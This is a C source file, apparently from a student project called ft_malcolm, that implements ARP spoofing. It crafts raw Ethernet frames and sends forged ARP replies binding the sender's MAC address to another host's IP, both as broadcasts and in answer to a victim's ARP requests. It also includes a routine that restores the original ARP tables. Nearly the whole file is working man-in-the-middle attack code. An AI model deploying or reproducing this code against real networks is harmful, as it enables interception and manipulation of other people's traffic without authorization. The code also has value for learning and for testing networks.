//
// Created by loumouli on 12/13/23.
//

#include "ft_malcolm.h"

static void base_init_packet(t_packet* packet) {
  memset(packet, 0, sizeof(*packet));
  packet->ar_hrd = htons(HW_TYPE_ETHERNET);
  packet->ar_pro = htons(ETH_P_IP);
  packet->ar_hln = LEN_HW_ETHERNET;
  packet->ar_pln = LEN_PROTO_IPV4;
  packet->ar_op = htons(ARPOP_REPLY);
}

static void fill_field_packet(t_packet* packet, const uint8_t* sender_mac, const uint8_t* sender_ip,
                              const uint8_t* target_mac, const uint8_t* target_ip) {
  uint32_t tmp_int;
  memcpy(packet->ar_sha, sender_mac, 6); //my mac address
  tmp_int = inet_addr((const char *)sender_ip);
  memcpy(packet->ar_sip, &tmp_int, 4); //src ip target
  memcpy(packet->ar_tha, target_mac, 6); //target mac address
  tmp_int = inet_addr((const char *)target_ip);
  memcpy(packet->ar_tip, &tmp_int, 4); //target ip address
}

static void init_ether_frame(ethernet_frame* frame, const void* dest_addr, const void* src_addr, const void* payload,
                             const size_t len_pld) {
  memset(frame, 0, sizeof(*frame));
  memcpy(frame->dest_addr, dest_addr, 6);
  memcpy(frame->src_addr, src_addr, 6);
  const uint16_t ether_type = htons(ETH_P_ARP);
  memcpy(&frame->ethertype, &ether_type, sizeof(uint16_t));
  memcpy(frame->data, payload, len_pld);
}

static void init_dest_sock(struct sockaddr_ll* dest, const t_malcolm* mal) {
  memset(dest, 0, sizeof(*dest));
  dest->sll_family = AF_PACKET;
  dest->sll_protocol = htons(ETH_P_ARP);
  dest->sll_ifindex = (int32_t)mal->index;
  dest->sll_hatype = htons(ARPHRD_ETHER);
  dest->sll_halen = ETH_ALEN;
  dest->sll_pkttype = PACKET_OTHERHOST;
}

void send_fake_arp_packet(const t_malcolm* mal, const uint32_t target) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest = {0};

  const uint8_t* ff_address = (uint8_t[]){255, 255, 255, 255, 255, 255};
  base_init_packet(&packet);
  if (target == 1)
    fill_field_packet(&packet, (const uint8_t *)mal->ifr.ifr_hwaddr.sa_data, mal->ip_src, ff_address, mal->ip_target);
  else if (target == 2)
    fill_field_packet(&packet, (const uint8_t *)mal->ifr.ifr_hwaddr.sa_data, mal->ip_target, ff_address, mal->ip_src);
  init_ether_frame(&frame, ff_address, mal->ifr.ifr_hwaddr.sa_data, &packet, sizeof(packet));
  init_dest_sock(&dest, mal);
  const ssize_t byte_sent = sendto(mal->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest, sizeof(dest));
  if (byte_sent == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
}

void restore_arp_tables(const t_malcolm* mal, const uint32_t target) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest = {0};

  const uint8_t* ff_address = (uint8_t[]){255, 255, 255, 255, 255, 255};
  base_init_packet(&packet);
  packet.ar_op = htons(ARPOP_REQUEST);
  if (target == 1)
    fill_field_packet(&packet, mal->mac_src_byte_arr, mal->ip_src, ff_address, mal->ip_target);
  else if (target == 2)
    fill_field_packet(&packet, mal->mac_target_byte_arr, mal->ip_target, ff_address, mal->ip_src);
  init_ether_frame(&frame, ff_address, packet.ar_sha, &packet, sizeof(packet));
  init_dest_sock(&dest, mal);
  memset(frame.dest_addr, 255, 6);
  const ssize_t byte_send = sendto(mal->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest, sizeof(dest));
  if (byte_send == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
  dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, target == 1 ? mal->mac_target : mal->mac_src);
}

void spoof_back_request(const t_malcolm* malcolm, const ethernet_frame* eth_frame) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest = {0};

  dprintf(1, "Preparing spoofing response...\n");
  base_init_packet(&packet);
  fill_field_packet(&packet, (const uint8_t*)malcolm->ifr.ifr_hwaddr.sa_data, malcolm->ip_target, eth_frame->src_addr, eth_frame->data + 8);
  init_ether_frame(&frame, eth_frame->src_addr, (const uint8_t*)malcolm->ifr.ifr_hwaddr.sa_data, &packet, sizeof(packet));
  init_dest_sock(&dest, malcolm);
  dprintf(1, "Launching respongse...\n");
  const ssize_t byte_send = sendto(malcolm->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest, sizeof(dest));
  if (byte_send == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
  if (byte_send == sizeof(frame))
    dprintf(1, "Target hit by repsonse !\n");
}
